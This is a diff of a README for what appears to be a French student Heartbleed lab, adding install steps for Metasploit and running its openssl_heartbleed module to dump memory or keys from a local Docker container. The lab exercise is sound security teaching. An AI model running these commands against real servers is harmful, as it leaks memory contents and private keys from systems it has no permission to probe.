@@ -4,7 +4,7 @@
 
 * Guillaume MALLET
 * Tom RUSSELLO
-* Vincent TAVERNEIR
+* Vincent TAVERNIER
 
 ## Faille choisie
 
@@ -22,16 +22,25 @@ Versions vulnérables : OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
 
 ```bash
 # Build the image
-docker build -t cysec-heartbleed .
+sudo docker build -t cysec-heartbleed .
 
 # Run a container from the built image
-docker run --name cysec-heartbleed -it cysec-heartbleed
+sudo docker run --name cysec-heartbleed -it cysec-heartbleed
 
 # Find out the IP address of the container
 docker network inspect bridge
 
+# Installations des paquets nécessaires pour metasploit (exemple sous Debian)
+sudo apt-get install git-core postgresql curl ruby-dev nmap gem
+gem install wirble sqlite3 bundler
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit*
+bundle install
+
+
+
 # Run metasploit
-msfconsole
+./msfconsole
 use auxiliary/scanner/ssl/openssl_heartbleed
 set ACTION DUMP      # Just dump data. Use KEYS if you want to try dumping the keys
 set RHOST 172.17.0.2 # IP address from the network inspect command
